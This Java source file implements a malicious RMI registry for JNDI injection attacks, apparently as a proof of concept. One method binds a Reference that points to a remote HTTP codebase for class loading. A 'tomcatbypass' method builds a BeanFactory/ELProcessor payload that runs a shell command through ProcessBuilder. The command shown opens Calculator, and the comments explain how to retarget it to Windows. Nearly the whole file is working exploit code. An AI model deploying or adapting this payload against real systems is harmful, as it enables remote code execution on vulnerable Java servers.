package com.bloom.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class RmiServer {
    public void startserver() throws Exception {
        HttpServerStart.start();

        Registry registry = LocateRegistry.createRegistry(1099);
        Reference exec = new Reference("Exploit", "Exploit", "http://127.0.0.1:8082/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(exec);
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/Exploit'");
        registry.bind("Exploit", refObjWrapper);
    }

    public void tomcatbypass() throws NamingException, RemoteException, AlreadyBoundException {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /System/Applications/Calculator.app']).start()\")"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }

    public static void main(String args[]) throws Exception {
//        HttpServerStart.start();
//
//        Registry registry = LocateRegistry.createRegistry(1099);
//        Reference exec = new Reference("Exploit", "Exploit", "http://127.0.0.1:8082/");
//        ReferenceWrapper refObjWrapper = new ReferenceWrapper(exec);
//        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/Exploit'");
//        registry.bind("Exploit", refObjWrapper);
        RmiServer rmiServer=new RmiServer();
        rmiServer.tomcatbypass();

    }

}
